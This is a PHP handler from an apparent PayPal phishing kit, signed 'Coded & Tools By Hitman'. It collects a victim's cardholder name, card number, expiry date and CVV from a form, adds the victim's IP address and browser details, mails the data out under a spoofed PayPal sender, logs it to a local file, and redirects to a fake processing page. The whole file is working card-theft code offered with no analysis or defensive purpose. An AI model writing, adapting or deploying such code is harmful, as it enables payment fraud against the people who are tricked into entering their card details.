<?php
include "to.php";
$CCName  = $_POST['CCName'];
$card_number= $_POST['card_number'];
$month   = $_POST['month'];
$year   = $_POST['year'];
$cvv1     = $_POST['cvv1'];
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Paypal-3 -------------
CCName : $CCName
card_number : $card_number
month : $month / year : $year
cvv1 : $cvv1
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Link : $Link
Date : $Date / Time : $Time
---------- Coded & Tools By Hitman ---------";
$MAIL_TITLE = "Credit Card | ".$IP."";
$MAIL_HEADER = "From: Paypal.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("rezult.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=websc-proccessing.php'>";exit;

?>
